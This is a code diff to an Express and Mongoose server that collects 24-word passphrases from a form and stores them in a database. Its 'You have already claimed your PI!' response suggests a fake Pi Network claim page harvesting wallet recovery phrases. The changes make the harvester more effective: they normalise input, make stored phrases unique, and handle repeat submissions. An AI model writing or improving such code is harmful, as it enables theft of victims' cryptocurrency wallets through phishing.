@@ -22,7 +22,7 @@ mongoose
 
 // Define Mongoose Schema and Model
 const PassphraseSchema = new mongoose.Schema({
-    passphrase: { type: String, required: true }
+    passphrase: { type: String, required: true, unique: true } // Ensure unique passphrases
 });
 const Passphrase = mongoose.model('Passphrase', PassphraseSchema);
 
@@ -33,10 +33,13 @@ app.get('/', (req, res) => {
 
 // POST Route to handle form submission
 app.post('/submit', async (req, res) => {
-    const { passphrase } = req.body;
+    let { passphrase } = req.body;
+
+    // Normalize the passphrase (remove extra spaces and convert to lowercase)
+    passphrase = passphrase.trim().toLowerCase();
 
     // Validate passphrase
-    if (!passphrase || passphrase.trim().split(" ").length !== 24) {
+    if (!passphrase || passphrase.split(" ").length !== 24) {
         return res.status(400).send('Invalid passphrase. Ensure it has exactly 24 words.');
     }
 
@@ -67,6 +70,18 @@ app.post('/submit', async (req, res) => {
         res.status(200).send(successMessage);
     } catch (error) {
         console.error('Error saving passphrase:', error);
+
+        // Handle duplicate key error explicitly
+        if (error.code === 11000) {
+            return res.status(200).send(`
+                <div style="background-color: white; padding: 20px; text-align: center;">
+                    <h2 style="font-size: 24px; font-family: Arial, sans-serif; color: #ff0000;">
+                        You have already claimed your PI!
+                    </h2>
+                </div>
+            `);
+        }
+
         res.status(500).send('Failed to save passphrase.');
     }
 });
